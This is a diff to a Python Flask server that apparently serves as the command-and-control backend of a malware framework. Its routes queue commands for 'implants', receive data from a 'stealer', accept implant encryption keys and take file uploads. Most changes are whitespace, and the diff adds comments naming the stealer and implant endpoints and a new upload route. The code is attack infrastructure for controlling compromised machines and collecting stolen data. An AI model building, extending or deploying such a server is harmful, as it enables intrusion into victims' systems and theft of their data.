@@ -34,8 +34,6 @@ app.config['CORS_HEADERS'] = 'Content-Type'
 jwt = JWTManager(app)
 
 # Logs user out of system
-
-
 @app.route('/logout', methods=["POST"])
 def logout():
     try:
@@ -71,14 +69,11 @@ def handle_test():
     stuff = tools.executeInsertQuery("SELECT * from command_queue")
     return jsonify(stuff)
 
-
 @app.route("/")
 def home():
     return "<div>Hi</div>", 200
 
 # api endpoint to queue a command
-
-
 @app.route("/queueCommand", methods=["POST"])
 @jwt_required()
 def handle_execute():
@@ -107,8 +102,6 @@ def handle_execute():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List all commands for a particular implant
-
-
 @app.route("/get_qcommands", methods=["POST"])
 def get_qcommands():
     data = request.json
@@ -147,8 +140,6 @@ def get_qcommands():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List all commands for a particular implant, in json
-
-
 @app.route("/get_commands", methods=["POST"])
 def get_commands():
     data = request.json
@@ -273,7 +264,7 @@ def display_implants():
         print(f"Error displaying implants: {e}")
         return e, {'Access-Control-Allow-Origin': config.clientURL}
 
-
+#Endpoint for stealer to connect to 
 @app.route("/response_stealer", methods=["POST"])
 @cross_origin()
 def handle_response_stealer():
@@ -291,7 +282,7 @@ def handle_response_stealer():
         print(error)
         return error, 402, {'Access-Control-Allow-Origin': config.clientURL}
 
-
+# Route for implant to post a new symmetric key 
 @app.route("/new_symkey", methods=["POST"])
 def getsymkey():
     try:
@@ -483,7 +474,6 @@ def testThis():
 
 # Gets log history of a particular implant, for console
 
-
 @app.route("/get_history", methods=["POST"])
 def get_history():
     try:
@@ -516,4 +506,11 @@ def get_history():
         print(e)
         return e, {'Access-Control-Allow-Origin': '*'}
 
-    # Construct a linear history of commands -> responses
+@app.route("/upload_files", methods=["POST"])
+def upload_files():
+    try:
+        file = request.files
+        print("recieved upload_files: \n Response: ")
+        print(file)
+    except Exception as e:
+        return e, {'Access-Control-Allow-Origin': '*'}
